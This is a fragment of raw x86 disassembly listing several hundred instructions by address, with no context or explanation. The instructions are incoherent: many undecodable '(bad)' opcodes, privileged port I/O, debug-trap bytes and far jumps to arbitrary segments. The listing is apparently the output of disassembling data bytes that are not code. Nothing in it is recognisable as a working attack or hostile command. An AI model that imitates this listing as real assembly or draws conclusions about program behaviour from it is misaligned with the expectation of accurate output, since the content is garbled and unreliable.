  424ea8:	sbb    BYTE PTR gs:[ebp+0x4dd97505],bh
  424eaf:	add    eax,0xe3110f72
  424eb4:	fldenv [esi+0xfdcdd16]
  424eba:	inc    esi
  424ebb:	add    al,0xc7
  424ebd:	mov    ecx,0xb77dda7c
  424ec2:	inc    edx
  424ec3:	sti    
  424ec4:	mov    edx,0x435e4b74
  424ec9:	push   DWORD PTR [ebp+0x84590fe]
  424ecf:	xchg   dh,dh
  424ed1:	jae    0x424f12
  424ed3:	mul    BYTE PTR [ebp-0x3a8e0aeb]
  424ed9:	sbb    DWORD PTR [ecx-0x56],0xffffffa4
  424edd:	push   esp
  424ede:	inc    edi
  424edf:	mov    edx,0x40b8efc7
  424ee4:	aad    0x4d
  424ee6:	jecxz  0x424eea
  424ee8:	or     eax,0xb0cfcfa5
  424eed:	sub    BYTE PTR [ecx-0x1c4a58d1],bl
  424ef3:	clc    
  424ef4:	mov    edi,0x84721833
  424ef9:	(bad)  
  424efa:	in     eax,dx
  424efb:	jno    0x424f09
  424efd:	icebp  
  424efe:	daa    
  424eff:	retf   
  424f00:	ror    DWORD PTR [ecx],1
  424f02:	pop    ss
  424f03:	inc    esi
  424f04:	pop    esi
  424f05:	mov    ebx,0x89895b49
  424f0a:	mov    al,ds:0xea3cfa04
  424f0f:	push   ecx
  424f10:	popa   
  424f11:	push   ebx
  424f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f13:	mov    BYTE PTR [ebx+0x5a],ch
  424f16:	out    dx,eax
  424f17:	jae    0x424e9f
  424f19:	std    
  424f1a:	xchg   ebx,eax
  424f1b:	pop    ds
  424f1c:	sbb    eax,ecx
  424f1e:	nop
  424f1f:	cmp    DWORD PTR [edi],esp
  424f21:	stos   DWORD PTR es:[edi],eax
  424f22:	lea    esp,[ebx-0x48e08127]
  424f28:	push   esp
  424f29:	or     eax,DWORD PTR [edi+0x79171370]
  424f2f:	daa    
  424f30:	(bad)  
  424f31:	sbb    eax,0x25a47373
  424f36:	jmp    0x570743b6
  424f3b:	adc    DWORD PTR [eax+0x19dfd629],esp
  424f41:	inc    edi
  424f42:	cli    
  424f43:	gs retf 0x257a
  424f47:	mov    BYTE PTR [ebp+0x540a6136],dh
  424f4d:	mov    ah,0xef
  424f4f:	add    bl,dh
  424f51:	sub    edi,edx
  424f53:	xor    bh,BYTE PTR [ecx]
  424f55:	arpl   WORD PTR [eax-0x21e57143],cx
  424f5b:	retf   
  424f5c:	(bad)  
  424f5d:	xchg   esp,eax
  424f5e:	mov    ds:0xcb20ef5c,eax
  424f63:	xchg   ebp,eax
  424f64:	sahf   
  424f65:	call   FWORD PTR [esp+eax*2+0x5a]
  424f69:	out    0x27,al
  424f6b:	clc    
  424f6c:	out    dx,al
  424f6d:	outs   dx,DWORD PTR ds:[esi]
  424f6e:	push   ds
  424f6f:	adc    dl,BYTE PTR [ecx]
  424f71:	cmp    al,0xf6
  424f73:	mov    edx,0x4c3dd829
  424f78:	cmc    
  424f79:	sahf   
  424f7a:	fnsave [ecx+0x23e569bb]
  424f80:	dec    esi
  424f81:	xor    eax,0x5f724a47
  424f86:	add    esi,esp
  424f88:	cdq    
  424f89:	call   0xc7b9:0xbd1d5d39
  424f90:	jne    0x424ff8
  424f92:	xchg   esp,eax
  424f93:	cs jne 0x424f8a
  424f96:	fistp  DWORD PTR [edi]
  424f98:	pop    ebp
  424f99:	sub    cl,BYTE PTR [ecx+0x16]
  424f9c:	mov    ebp,DWORD PTR [ecx+ecx*4]
  424f9f:	in     al,dx
  424fa0:	adc    eax,0x60533ac9
  424fa5:	mov    cl,bl
  424fa7:	lahf   
  424fa8:	(bad)  
  424fa9:	xlat   BYTE PTR ds:[ebx]
  424faa:	ror    BYTE PTR [edi+eiz*4],cl
  424fad:	mul    BYTE PTR [esi+edi*2-0x60]
  424fb1:	and    eax,0x9919c51d
  424fb6:	fnsave [edx]
  424fb8:	jmp    0x424f62
  424fba:	pop    eax
  424fbb:	jl     0x424f63
  424fbd:	sar    BYTE PTR [esi+0x6cc15c43],1
  424fc3:	psrad  mm4,mm3
  424fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fc7:	aad    0x22
  424fc9:	(bad)  [esi+ebx*8]
  424fcc:	scas   al,BYTE PTR es:[edi]
  424fcd:	fs jle 0x424fb6
  424fd0:	fimul  DWORD PTR [ebx-0x15349e60]
  424fd6:	shl    BYTE PTR [esi+0x13],1
  424fd9:	lahf   
  424fda:	fstp   QWORD PTR [esp+ebp*2+0x1d]
  424fde:	(bad)  
  424fdf:	jb     0x424fa6
  424fe1:	jno    0x424fa7
  424fe3:	cmovg  eax,DWORD PTR [edx]
  424fe6:	sahf   
  424fe7:	inc    ebx
  424fe8:	test   al,al
  424fea:	aam    0x68
  424fec:	jmp    DWORD PTR [ebx-0x788247c8]
  424ff2:	xchg   edi,eax
  424ff3:	clc    
  424ff4:	xchg   DWORD PTR [esi],ecx
  424ff6:	ret    
  424ff7:	dec    ebp
  424ff8:	test   DWORD PTR [edi-0x388974f3],ecx
  424ffe:	or     eax,0xc145a31a
  425003:	out    dx,eax
  425004:	aad    0xcb
  425006:	xor    ch,BYTE PTR [ecx]
  425008:	push   esp
  425009:	mov    cl,0x4c
  42500b:	inc    ebx
  42500c:	lea    ecx,[eax-0x75c88616]
  425012:	jns    0x424fce
  425014:	adc    eax,edi
  425016:	inc    ebx
  425017:	push   esi
  425018:	iret   
  425019:	lahf   
  42501a:	lahf   
  42501b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42501c:	mov    esi,0xc081106d
  425021:	or     DWORD PTR [ecx+0x70],0x886e90fa
  425028:	sbb    dl,ch
  42502a:	stos   BYTE PTR es:[edi],al
  42502b:	inc    edx
  42502c:	dec    ebp
  42502d:	xor    DWORD PTR [esi+0x31],ebx
  425030:	ins    BYTE PTR es:[edi],dx
  425031:	ja     0x425011
  425033:	imul   ebx,DWORD PTR [eax+0x3ff60189],0xffffffb9
  42503a:	out    dx,eax
  42503b:	inc    edx
  42503c:	retf   0xc53f
  42503f:	mov    BYTE PTR [edx+0x7c8996cc],dl
  425045:	loopne 0x42508a
  425047:	nop
  425048:	jb     0x4250ad
  42504a:	push   ds
  42504b:	add    ecx,edi
  42504d:	in     eax,dx
  42504e:	jecxz  0x425050
	...
  425058:	add    BYTE PTR [eax],al
  42505a:	inc    ebx
  42505b:	lea    ebx,[edi]
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x15
  425067:	cmp    al,0x8f
  425069:	mov    esi,0x1c89f
  42506e:	std    
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [edi+eiz*1],ch
  425074:	scas   al,BYTE PTR es:[edi]
  425075:	fsubr  DWORD PTR [ecx+0x31]
  425078:	pop    ds
  425079:	adc    ch,BYTE PTR [eax-0x45]
  42507c:	sub    eax,0x90c39ee6
  425081:	in     eax,dx
  425082:	mov    bh,0x81
  425084:	aaa    
  425085:	xchg   esp,eax
  425086:	mov    ecx,0x4dfcdc15
  42508b:	sbb    eax,0xc318aa8c
  425090:	mov    ds:0x3f7e65a2,eax
  425095:	scas   eax,DWORD PTR es:[edi]
  425096:	sub    eax,0xc613480b
  42509b:	mov    al,BYTE PTR [edx]
  42509d:	in     al,0xf0
  42509f:	packsswb mm6,QWORD PTR [edi-0x24]
  4250a3:	mov    bh,0x99
  4250a5:	xchg   ebx,eax
  4250a6:	mov    dl,0x43
  4250a8:	pusha  
  4250a9:	mov    ebp,0x5f445
  4250ae:	pop    es
  4250af:	(bad)  
  4250b0:	mov    al,0xc3
  4250b2:	pop    edi
  4250b3:	jmp    0x6c0:0x5490e57e
  4250ba:	cmp    eax,0x29747650
  4250bf:	add    al,0xb5
  4250c1:	dec    ebp
  4250c2:	icebp  
  4250c3:	pop    edx
  4250c4:	push   ecx
  4250c5:	push   cs
  4250c6:	sahf   
  4250c7:	lods   eax,DWORD PTR ds:[esi]
  4250c8:	aas    
  4250c9:	inc    eax
  4250ca:	sbb    eax,0xd2ba72e8
  4250cf:	clc    
  4250d0:	out    0x97,al
  4250d2:	push   edx
  4250d3:	mov    ds:0x73786539,al
  4250d8:	out    dx,al
  4250d9:	adc    eax,0x20a3e402
  4250de:	dec    ebp
  4250df:	in     eax,dx
  4250e0:	xor    cl,bl
  4250e2:	sbb    DWORD PTR [ecx],esi
  4250e4:	cmp    DWORD PTR [ebp+0x4899f370],0xfffffff0
  4250eb:	xor    al,0x57
  4250ed:	aaa    
  4250ee:	mov    esi,0xb20afab8
  4250f3:	into   
  4250f4:	call   0x69f3:0x3149436b
  4250fb:	or     ebx,DWORD PTR [edi-0x39]
  4250fe:	dec    eax
  4250ff:	jmp    0xf8ab:0x47286310
  425106:	dec    ebx
  425107:	test   al,0x21
  425109:	sub    esp,DWORD PTR [ecx]
  42510b:	repnz mov dh,0x16
  42510e:	ds mov dl,0x3d
  425111:	sub    esi,DWORD PTR [ebx]
  425113:	dec    eax
  425114:	sub    BYTE PTR [ebx],ch
  425116:	push   ebp
  425117:	retf   0x4699
  42511a:	mov    esp,0x8eccfd0b
  42511f:	into   
  425120:	mov    edx,0x6e07ceea
  425125:	pop    ebp
  425126:	(bad)  
  425127:	out    0x12,al
  425129:	jnp    0x425198
  42512b:	in     eax,dx
  42512c:	retf   
  42512d:	fmul   QWORD PTR [ecx+ebx*8+0x3f11910d]
  425134:	xchg   esi,ecx
  425136:	pop    esi
  425137:	pop    edi
  425138:	lds    eax,FWORD PTR [edi-0x69]
  42513b:	xchg   esi,eax
  42513c:	pop    esp
  42513d:	scas   eax,DWORD PTR es:[edi]
  42513e:	pop    eax
  42513f:	out    dx,eax
  425140:	mov    bl,BYTE PTR ds:0xb170581b
  425146:	(bad)  
  425147:	mov    ecx,0xe3e66871
  42514c:	or     DWORD PTR [ecx],eax
  42514e:	xor    DWORD PTR [ebx],ebp
  425150:	mov    esi,0xb9efd766
  425155:	mov    edi,0xcdff554f
  42515a:	xchg   ebx,eax
  42515b:	popf   
  42515c:	xchg   ebp,eax
  42515d:	add    BYTE PTR [ecx+0x5ecab029],bh
  425163:	sbb    DWORD PTR [edi+eax*2+0x583c719b],0xb55cbd58
  42516e:	sub    al,0x6b
  425170:	cs or  eax,0xf47e6478
  425176:	aas    
  425177:	into   
  425178:	xchg   esp,eax
  425179:	in     al,dx
  42517a:	or     eax,0x78de4a17
  42517f:	sub    al,BYTE PTR [esi]
  425181:	cmc    
  425182:	std    
  425183:	sub    cl,BYTE PTR [esi]
  425185:	xchg   esi,eax
  425186:	lock pop ds
  425188:	std    
  425189:	out    dx,al
  42518a:	mov    edi,0xa7cf8952
  42518f:	pop    es
  425190:	jmp    0x4251ee
  425192:	mov    ah,0x4b
  425194:	xchg   ah,cl
  425196:	mov    cl,0x5f
  425198:	adc    DWORD PTR [ebx-0x75d5c68a],ebp
  42519e:	inc    ebx
  42519f:	leave  
  4251a0:	dec    ebp
  4251a1:	gs xor al,bh
  4251a4:	pop    es
  4251a5:	lock pop edi
  4251a7:	int    0xcc
  4251a9:	or     bl,ah
  4251ab:	inc    edx
  4251ac:	in     al,0xd1
  4251ae:	sub    bh,BYTE PTR gs:[ebx]
  4251b1:	xlat   BYTE PTR ds:[ebx]
  4251b2:	nop    DWORD PTR [ebx]
  4251b5:	jns    0x425223
  4251b7:	dec    ecx
  4251b8:	xlat   BYTE PTR ds:[ebx]
  4251b9:	in     al,dx
  4251ba:	aad    0x4c
  4251bc:	xchg   ebp,eax
  4251bd:	rol    DWORD PTR [ebx-0x3],cl
  4251c0:	jge    0x42521c
  4251c2:	popf   
  4251c3:	xchg   esp,eax
  4251c4:	mov    ebp,0x92a5d185
  4251c9:	popf   
  4251ca:	inc    esi
  4251cb:	ds jle 0x42515f
  4251ce:	sti    
  4251cf:	arpl   WORD PTR [edi],sp
  4251d1:	adc    BYTE PTR [ecx],dh
  4251d3:	adc    BYTE PTR [ebx],0x4b
  4251d6:	push   edi
  4251d7:	sub    dl,BYTE PTR [edi+0x3ee8b3f0]
  4251dd:	out    dx,al
  4251de:	add    al,0xe0
  4251e0:	loop   0x4251e4
  4251e2:	lods   eax,DWORD PTR ds:[esi]
  4251e3:	inc    ebx
  4251e4:	dec    esp
  4251e5:	sbb    eax,0xe9413eaf
  4251ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251eb:	ins    BYTE PTR es:[edi],dx
  4251ec:	inc    edi
  4251ed:	push   esi
  4251ee:	jae    0x42526d
  4251f0:	fwait
  4251f1:	sbb    BYTE PTR [ecx-0x54f84e90],ah
  4251f7:	ins    DWORD PTR es:[edi],dx
  4251f8:	mov    edi,0xc890c8ac
  4251fd:	sbb    ecx,DWORD PTR [ecx-0x73bd5fd6]
  425203:	loope  0x425279
  425205:	and    ah,BYTE PTR [ebp+0x17]
  425208:	ins    DWORD PTR es:[edi],dx
  425209:	sub    cl,BYTE PTR [esi]
  42520b:	jmp    0x3612:0xf5932919
  425212:	or     eax,0x10ed62d
  425217:	ins    DWORD PTR es:[edi],dx
  425218:	pop    esp
  425219:	loop   0x42522f
  42521b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42521d:	call   0x2ab3:0xa923311d
  425224:	inc    ebp
  425225:	(bad)
  425228:	xchg   esp,eax
  425229:	in     al,dx
  42522a:	out    dx,al
  42522b:	call   0xe968361f
  425230:	or     ebx,edi
  425232:	fprem1 
  425234:	mov    eax,ds:0x23938fa8
  425239:	outs   dx,DWORD PTR ds:[esi]
  42523a:	mov    eax,0xf8cdc6c9
  42523f:	scas   al,BYTE PTR es:[edi]
  425240:	rcl    DWORD PTR [esi+0x7c],0x4a
  425244:	add    eax,0xaa839de3
  425249:	xchg   esp,eax
  42524a:	mov    ebx,0xc90bc9ad
  42524f:	fld    DWORD PTR [edx+edx*1]
  425252:	xor    ebx,DWORD PTR [edi+eiz*8-0x309fe117]
  425259:	jmp    0x42520e
  42525b:	pop    eax
  42525c:	loop   0x42525a
  42525e:	inc    eax
  42525f:	shl    DWORD PTR [edi+0x5],0xe7
  425263:	out    0x96,eax
  425265:	stos   DWORD PTR es:[edi],eax
  425266:	push   ecx
  425267:	mov    dh,0xdd
  425269:	(bad)  
  42526a:	shl    BYTE PTR [edi+0x79],0x84
  42526e:	in     eax,0x0
	...
  425278:	add    BYTE PTR [eax],al
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	cmp    eax,0x9c74f87a
  42528b:	retf   0x1
  42528e:	std    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    BYTE PTR [edx+0x47b4654b],dl
  425297:	inc    esi
  425298:	fsub   QWORD PTR [edi]
  42529a:	mov    eax,ds:0x854bdf64
  42529f:	mov    ecx,0x1919152d
  4252a4:	cmp    BYTE PTR [edx],dl
  4252a6:	jp     0x425263
  4252a8:	inc    ebp
  4252a9:	loop   0x42527d
  4252ab:	rol    DWORD PTR [esi+0x7a2acf7b],1
  4252b1:	or     al,0x54
  4252b3:	mov    eax,0xb2efa8c0
  4252b8:	(bad)  
  4252b9:	fcomp  DWORD PTR [edx]
  4252bb:	mov    esp,0x70e308b3
  4252c0:	push   eax
  4252c1:	inc    esp
  4252c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252c3:	pusha  
  4252c4:	or     DWORD PTR [ebp-0x33],ebx
  4252c7:	xchg   BYTE PTR [edi-0x2508a3fc],dl
  4252cd:	push   0x12ab1c11
  4252d2:	ins    DWORD PTR es:[edi],dx
  4252d3:	add    al,0xc1
  4252d5:	cmp    eax,0x3c65535d
  4252da:	clc    
  4252db:	es inc eax
  4252dd:	dec    ebx
  4252de:	jns    0x4252c9
  4252e0:	push   ebp
  4252e1:	fisttp QWORD PTR [edx-0x621f6254]
  4252e7:	mov    ebx,DWORD PTR [edx-0x6370fb44]
  4252ed:	inc    ebp
  4252ee:	lds    esi,FWORD PTR [ecx-0x62]
  4252f1:	pushf  
  4252f2:	push   es
  4252f3:	or     dh,ch
  4252f5:	jmp    DWORD PTR [edi+eiz*1+0x14bc0e4]
  4252fc:	xchg   BYTE PTR [ecx-0x69a151da],ch
  425302:	lock cmp esp,DWORD PTR es:0xb7c52389
  42530a:	in     eax,dx
  42530b:	xchg   edi,eax
  42530c:	ror    DWORD PTR [eax],cl
  42530e:	add    cl,BYTE PTR [ebp-0x24]
  425311:	or     bl,BYTE PTR [ebx+edi*2+0x55]
  425315:	imul   ebx,DWORD PTR [edx*4+0x6dbab117],0x1f7d8e9c
  425320:	leave  
  425321:	movq   mm7,QWORD PTR es:[edi-0x61649aea]
  425329:	gs and al,0x16
  42532c:	adc    al,0x78
  42532e:	xchg   edx,eax
  42532f:	hlt    
  425330:	dec    esi
  425331:	mov    dh,0x3f
  425333:	ss addr16 jmp eax
  425337:	push   edi
  425338:	push   ss
  425339:	mov    ds:0xfe716513,al
  42533e:	and    DWORD PTR [esi+esi*2-0x7],esi
  425342:	cmp    ch,BYTE PTR [ecx]
  425344:	lds    esp,FWORD PTR [esi]
  425346:	inc    eax
  425347:	fnsave [ebx+0x55]
  42534a:	call   0x7e6e:0x7461aa81
  425351:	in     eax,0xa2
  425353:	push   edx
  425354:	jnp    0x4252e3
  425356:	jecxz  0x42537b
  425358:	sub    al,0x2b
  42535a:	push   esp
  42535b:	xlat   BYTE PTR ds:[ebx]
  42535c:	mov    esp,0x2c33a875
  425361:	fsubr  DWORD PTR [ebx-0x18]
  425364:	jle    0x4253d1
  425366:	pushf  
  425367:	add    eax,eax
  425369:	not    BYTE PTR [ebx]
  42536b:	push   ds
  42536c:	sub    eax,DWORD PTR [edi+0x41]
  42536f:	(bad)  
  425371:	call   0x2f3:0x19c26d73
  425378:	icebp  
  425379:	nop
  42537a:	jb     0x425339
  42537c:	jmp    0x4253c2
  42537e:	cmc    
  42537f:	push   ebp
  425380:	fld    QWORD PTR [edx-0x58a00afa]
  425386:	mov    esi,DWORD PTR [edx+0x3bdd6a1a]
  42538c:	xlat   BYTE PTR ds:[ebx]
  42538d:	nop
  42538e:	and    BYTE PTR [ebp+0x7f],cl
  425391:	or     eax,0x444f1e6e
  425396:	ins    BYTE PTR es:[edi],dx
  425397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425398:	repnz push ds
  42539a:	cmp    al,0x25
  42539c:	and    al,0xdf
  42539e:	mov    edx,0x8b03c1b7
  4253a3:	pushf  
  4253a4:	cwde   
  4253a5:	retf   0x4726
  4253a8:	inc    edi
  4253a9:	ret    0x4caf
  4253ac:	sbb    eax,0xa226b3b7
  4253b1:	outs   dx,DWORD PTR ds:[esi]
  4253b2:	xchg   bl,bh
  4253b4:	jle    0x425405
  4253b6:	xor    eax,0xfb2b40
  4253bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253bc:	cmp    al,dh
  4253be:	mov    al,ds:0x99bdec4f
  4253c3:	xor    al,0x5e
  4253c5:	call   0x88b7f916
  4253ca:	xlat   BYTE PTR ds:[ebx]
  4253cb:	sahf   
  4253cc:	ja     0x4253ce
  4253ce:	push   ebx
  4253cf:	add    bl,BYTE PTR [eax]
  4253d1:	loope  0x4253c6
  4253d3:	mov    edi,0x9abdbbb9
  4253d8:	jle    0x4253fc
  4253da:	clc    
  4253db:	out    dx,al
  4253dc:	cwde   
  4253dd:	rcr    al,0xac
  4253e0:	idiv   BYTE PTR [edi+0x7]
  4253e3:	push   esp
  4253e4:	dec    edi
  4253e5:	retf   0x2a69
  4253e8:	in     al,dx
  4253e9:	fmul   st,st(5)
  4253eb:	sar    al,cl
  4253ed:	xchg   ebp,eax
  4253ee:	jno    0x4253a3
  4253f0:	dec    edi
  4253f1:	retf   0xa67
  4253f4:	test   DWORD PTR [edx-0x43f6377e],ecx
  4253fa:	out    dx,al
  4253fb:	mov    ebp,0xff87b21
  425400:	and    esi,DWORD PTR [ecx-0x18]
  425403:	aam    0x82
  425405:	js     0x4253e0
  425407:	mov    ds:0xccaacb46,eax
  42540c:	scas   al,BYTE PTR es:[edi]
  42540d:	jno    0x425470
  42540f:	ja     0x425483
  425411:	sub    BYTE PTR [ecx+edx*1+0x7bc4b115],0x36
  425419:	pop    esi
  42541a:	jle    0x4253d9
  42541c:	inc    esp
  42541d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42541e:	jb     0x425445
  425420:	sbb    eax,0x4011c6f0
  425425:	mov    ebp,0x4f9531c4
  42542a:	fucom  st(7)
  42542c:	or     esi,DWORD PTR [edx]
  42542e:	sahf   
  42542f:	stos   BYTE PTR es:[edi],al
  425430:	jmp    0x425455
  425432:	loope  0x4254a4
  425434:	pop    esi
  425435:	sub    al,BYTE PTR ds:0xc43be8c4
  42543b:	retf   
  42543c:	icebp  
  42543d:	arpl   WORD PTR [eax],si
  42543f:	mov    edx,0x64f77c8f
  425444:	sub    eax,0x1c90f93e
  425449:	adc    eax,0xe904772c
  42544e:	pusha  
  42544f:	push   cs
  425450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425451:	push   es
  425452:	loop   0x425440
  425454:	sbb    DWORD PTR [esi+edx*1-0x43],edi
  425458:	scas   al,BYTE PTR es:[edi]
  425459:	dec    esi
  42545a:	ins    DWORD PTR es:[edi],dx
  42545b:	push   ebp
  42545c:	push   ecx
  42545d:	adc    eax,0x734e75f4
  425462:	xor    BYTE PTR [edi],0x14
  425465:	loop   0x42541b
  425467:	add    eax,0x2662a284
  42546c:	pop    es
  42546d:	push   cs
  42546e:	pop    eax
  42546f:	hlt    
  425470:	mov    eax,ds:0xa0a497e1
  425475:	cli    
  425476:	enter  0x26b5,0x23
  42547a:	pop    ecx
  42547b:	push   ebp
  42547c:	imul   ecx,DWORD PTR [ebx],0xffffff84
  42547f:	clc    
  425480:	xchg   edi,eax
  425481:	clc    
  425482:	or     BYTE PTR [edx+0x34],bl
  425485:	jbe    0x42545f
  425487:	ja     0x42546a
  425489:	mov    esp,0x8137267
  42548e:	mov    al,BYTE PTR [eax]
	...
  425498:	add    BYTE PTR [eax],al
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254a7:	aas    
  4254a8:	mov    ch,0x35
  4254aa:	cdq    
  4254ab:	int3   
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	std    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    BYTE PTR [ecx-0x54],bh
  4254b4:	ss gs dec ecx
  4254b7:	sub    eax,DWORD PTR [eax]
  4254b9:	sbb    BYTE PTR [esi+edi*8],bh
  4254bc:	jb     0x4254c4
  4254be:	push   ebx
  4254bf:	pop    eax
  4254c0:	jp     0x42545e
  4254c2:	adc    cl,BYTE PTR [ebx]
  4254c4:	jno    0x4254fb
  4254c6:	mov    edi,0xdd088326
  4254cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254cd:	add    BYTE PTR [ebx-0x7c23fe45],0x52
  4254d4:	xchg   esp,eax
  4254d5:	sbb    al,0xe3
  4254d7:	xlat   BYTE PTR ds:[ebx]
  4254d8:	call   0xbc68241e
  4254dd:	sub    al,BYTE PTR [ebx+0x31]
  4254e0:	jb     0x42555b
  4254e2:	cmc    
  4254e3:	pop    edx
  4254e4:	adc    DWORD PTR [ebx+0x2c],ebx
  4254e7:	xchg   ebx,eax
  4254e8:	stos   BYTE PTR es:[edi],al
  4254e9:	add    al,0xdd
  4254eb:	xchg   ecx,eax
  4254ec:	pop    ecx
  4254ed:	fld    QWORD PTR [ebp-0x1b]
  4254f0:	and    al,0x3b
  4254f2:	sub    DWORD PTR [ecx],esi
  4254f4:	rol    ebp,1
  4254f6:	nop
  4254f7:	sbb    BYTE PTR es:[ebx+esi*4+0x7ed7aaad],bl
  4254ff:	sub    BYTE PTR [eax+0x39b25145],dh
  425505:	shr    DWORD PTR [edx+esi*8],1
  425508:	test   ah,cl
  42550a:	dec    ebp
  42550b:	push   0x351a16b
  425510:	lea    ecx,[edi+0x5f]
  425513:	and    bh,ch
  425515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425516:	icebp  
  425517:	inc    ebx
  425518:	inc    edx
  425519:	imul   ebp,DWORD PTR [ecx-0x71cea0c3],0x3d799822
  425523:	sbb    BYTE PTR ds:0x429a8a32,0x7b
  42552a:	mov    ebx,0xe373ea20
  42552f:	retf   
  425530:	pushf  
  425531:	rol    BYTE PTR [edi+0x44],cl
  425534:	mov    dl,0xdf
  425536:	mov    ds:0xe322b6f0,al
  42553b:	cli    
  42553c:	jae    0x425552
  42553e:	sbb    DWORD PTR ds:0xe4e7d243,0xffffff87
  425545:	or     dh,dh
  425547:	scas   al,BYTE PTR es:[edi]
  425548:	out    0xb6,eax
  42554a:	fsub   st,st(4)
  42554c:	icebp  
  42554d:	dec    esp
  42554e:	sbb    DWORD PTR [ebp+0x40],ecx
  425551:	out    0xe1,ax
  425554:	sub    DWORD PTR [edi+0x16],ebp
  425557:	xchg   esi,eax
  425558:	jle    0x4255c4
  42555a:	(bad)  
  42555d:	mov    fs,WORD PTR [esp+esi*8-0x2c]
  425561:	and    ebx,edx
  425563:	push   ebx
  425564:	es add eax,0xfe28f917
  42556a:	mov    edi,0x21a73d3c
  42556f:	mov    ch,0xd1
  425571:	aad    0xad
  425573:	sahf   
  425574:	jecxz  0x425568
  425576:	sbb    al,0xc7
  425578:	mov    cl,0x38
  42557a:	xchg   edx,eax
  42557b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42557c:	aam    0x4f
  42557e:	fidivr DWORD PTR [ebp+0x33]
  425581:	data16 mov cl,0x75
  425584:	popa   
  425585:	and    ah,BYTE PTR [ebx]
  425587:	mov    al,0x92
  425589:	test   al,ch
  42558b:	mov    cl,0x52
  42558d:	cmp    al,0xd0
  42558f:	jmp    0x425523
  425591:	(bad)  
  425592:	in     al,dx
  425593:	ja     0x4255e4
  425595:	nop
  425596:	imul   esp,DWORD PTR [edx+0x854eba7],0xfffffffe
  42559d:	and    eax,0x8f697054
  4255a2:	aas    
  4255a3:	mov    fs,WORD PTR [ebx+0x61]
  4255a6:	and    al,0x91
  4255a8:	push   eax
  4255a9:	add    esi,DWORD PTR [ebp+0x41]
  4255ac:	in     eax,dx
  4255ad:	int    0xab
  4255af:	lea    ecx,[ebx]
  4255b1:	ss inc eax
  4255b3:	stos   BYTE PTR es:[edi],al
  4255b4:	pop    ss
  4255b5:	popf   
  4255b6:	xchg   ebx,eax
  4255b7:	scas   eax,DWORD PTR es:[edi]
  4255b8:	add    cl,BYTE PTR [ebp-0x31e96d82]
  4255be:	imul   ebp,DWORD PTR [ebp+0x2b059e3b],0x3199ad09
  4255c8:	sbb    al,0xc1
  4255ca:	mov    ch,0x89
  4255cc:	cli    
  4255cd:	mov    al,0x9b
  4255cf:	mov    al,0x2b
  4255d1:	or     al,0x1c
  4255d3:	jge    0x42562a
  4255d5:	mov    al,0xa6
  4255d7:	in     eax,dx
  4255d8:	jne    0x4255ba
  4255da:	sub    eax,0x32a1479c
  4255df:	jge    0x4255bb
  4255e1:	mov    dh,0xc6
  4255e3:	iret   
  4255e4:	or     dl,BYTE PTR [edi*8+0x2aedfc9]
  4255eb:	adc    esi,DWORD PTR [edx-0x6db10fdc]
  4255f1:	sbb    eax,0xf6009594
  4255f6:	cld    
  4255f7:	jmp    0x6c63:0xe2615226
  4255fe:	sbb    DWORD PTR [esi],ebp
  425600:	dec    ebx
  425601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425602:	sar    BYTE PTR [ebp-0x1165d4d7],1
  425608:	lea    edx,ss:[edi]
  42560b:	outs   dx,DWORD PTR cs:[esi]
  42560d:	push   ecx
  42560e:	sbb    ebx,DWORD PTR [ebx+eax*8+0x68]
  425612:	pop    es
  425613:	jns    0x425656
  425615:	dec    ebp
  425616:	retf   0x62ca
  425619:	pop    esp
  42561a:	cmp    al,0x94
  42561c:	lds    esp,FWORD PTR [ebx+0x19]
  42561f:	int3   
  425620:	pop    ss
  425621:	fxtract 
  425623:	pusha  
  425624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425625:	dec    ecx
  425626:	xchg   edx,eax
  425627:	popf   
  425628:	shl    DWORD PTR [ecx-0x2a211cf7],cl
  42562e:	pop    esp
  42562f:	(bad)  
  425630:	cli    
  425631:	iret   
  425632:	div    BYTE PTR [ebp+0x72c04098]
  425638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425639:	test   eax,0xc535e8ec
  42563e:	mov    DWORD PTR [edi+0x5bfe9767],ebp
  425644:	pusha  
  425645:	sbb    eax,0x5602e8f
  42564a:	push   edx
  42564b:	imul   ebx,edx,0x3c
  42564e:	hlt    
  42564f:	pop    ss
  425650:	into   
  425651:	mov    DWORD PTR [eax],ebx
  425653:	arpl   WORD PTR [eax],di
  425655:	neg    BYTE PTR [edx+0x58]
  425658:	xchg   ebx,eax
  425659:	sub    al,0x8f
  42565b:	jmp    0xf2d5:0xd1e4d837
  425662:	stos   BYTE PTR es:[edi],al
  425663:	aad    0x24
  425665:	and    al,0x6a
  425667:	(bad)  
  425668:	stos   DWORD PTR es:[edi],eax
  425669:	sbb    BYTE PTR [edx-0x52],bl
  42566c:	push   cs
  42566d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42566e:	mov    ch,BYTE PTR [edi]
